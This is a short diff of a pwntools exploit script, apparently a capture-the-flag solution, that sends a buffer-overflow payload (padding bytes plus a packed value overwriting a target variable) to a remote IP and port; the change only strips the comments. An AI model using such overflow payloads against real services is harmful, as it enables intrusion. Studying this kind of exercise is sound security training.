@@ -35,9 +35,9 @@ PORT = 58911
 
 r = remote(IP, PORT)
 
-payload  = b'A' * 32           # Fill buffer
-payload += b'B' * 8            # Overwrite alignment dummy value
-payload += p64(0x0badf00d)     # Overwrite the target value (≠ 0xdeadbeef)
+payload  = b'A' * 32           
+payload += b'B' * 8           
+payload += p64(0x0badf00d)     
 
 r.sendline(payload)
 sleep(1)
